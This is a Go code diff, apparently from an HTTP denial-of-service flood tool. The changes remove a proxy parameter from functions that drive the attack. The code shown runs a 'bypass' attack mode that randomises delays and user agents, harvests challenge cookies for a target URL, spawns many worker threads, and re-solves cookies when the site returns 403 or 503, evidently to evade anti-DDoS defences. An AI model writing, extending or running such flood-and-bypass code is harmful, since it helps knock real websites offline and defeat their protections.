@@ -24,7 +24,7 @@ type Attacker struct {
 	userAgent string
 }
 
-func ParseAttack(attack Attack, config Config, proxy string) {
+func ParseAttack(attack Attack, config Config) {
 	var attacker Attacker
 	attacker.config = config
 	attacker.attack = attack
@@ -32,7 +32,7 @@ func ParseAttack(attack Attack, config Config, proxy string) {
 	case "simple", "custom":
 		attacker.DefaultAttack()
 	case "bypass":
-		attacker.BypassAttack(proxy)
+		attacker.BypassAttack()
 	}
 }
 
@@ -54,11 +54,11 @@ func (a *Attacker) SetUserAgent() {
 	}
 }
 
-func (a *Attacker) SolveCookie(proxy string) error {
+func (a *Attacker) SolveCookie() error {
 	var err error
 	var cookies []Cookie
 	for i := 0; i < 3; i++ {
-		cookies, err = GetCookies(a.config, a.attack.TargetURL, a.attack.CustomHeader, a.userAgent, proxy)
+		cookies, err = GetCookies(a.config, a.attack.TargetURL, a.attack.CustomHeader, a.userAgent)
 		if err != nil {
 			fmt.Println(err)
 			time.Sleep(time.Second * 3)
@@ -201,12 +201,12 @@ func Equal(a, b []Cookie) bool {
 	return true
 }
 
-func (a *Attacker) BypassAttack(proxy string) {
+func (a *Attacker) BypassAttack() {
 	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
 	rand.Seed(seed.Int64())
 	time.Sleep(time.Second * time.Duration(rand.Intn(25)+5))
 	a.SetUserAgent()
-	err := a.SolveCookie(proxy)
+	err := a.SolveCookie()
 	if err != nil {
 		return
 	}
@@ -220,7 +220,7 @@ func (a *Attacker) BypassAttack(proxy string) {
 	for i := 0; i < a.attack.Thread; i++ {
 		go a.Worker(expired)
 	}
-	go a.CheckResponse(expired, proxy)
+	go a.CheckResponse(expired)
 
 	lastCookie := a.cookies
 	startTime := time.Now()
@@ -236,7 +236,7 @@ func (a *Attacker) BypassAttack(proxy string) {
 	}
 }
 
-func (a *Attacker) CheckResponse(expired chan bool, proxy string) {
+func (a *Attacker) CheckResponse(expired chan bool) {
 	exit := false
 	go func() {
 		exit = <-expired
@@ -257,7 +257,7 @@ func (a *Attacker) CheckResponse(expired chan bool, proxy string) {
 			continue
 		}
 		if r.StatusCode == 503 || r.StatusCode == 403 {
-			a.SolveCookie(proxy)
+			a.SolveCookie()
 		}
 		r.Body.Close()
 		time.Sleep(time.Second)
